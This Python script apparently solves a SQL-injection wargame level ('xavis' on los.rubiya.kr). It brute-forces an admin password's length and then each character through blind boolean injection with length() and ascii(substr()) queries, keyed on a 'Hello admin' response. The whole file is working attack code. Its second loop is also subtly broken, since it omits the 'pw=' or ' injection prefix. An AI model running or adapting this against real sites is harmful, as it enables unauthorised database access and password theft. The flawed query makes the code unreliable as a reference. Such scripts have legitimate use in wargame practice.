import urllib3
import requests

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력


ch="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+\|"

length = 0

for i in range(0,30):
    query = "pw=' or length(pw)={}%23".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    #print(req.text)
    if "Hello admin" in req.text:
        length = i
        break

print("password length is : ",length)

ans=''
for i in range(1, length+1):
    for j in ch:
        query = "ascii(substr(pw,{},1))={}%23".format(i, ord(j))
        req = requests.get(url+query, headers=header)
        print(url+query)
        if "Hello admin" in req.text:
            print("[+] find password letter is {}".format(j))
            print("the letter is {}".format(i))
            ans += j
            break

print(ans)
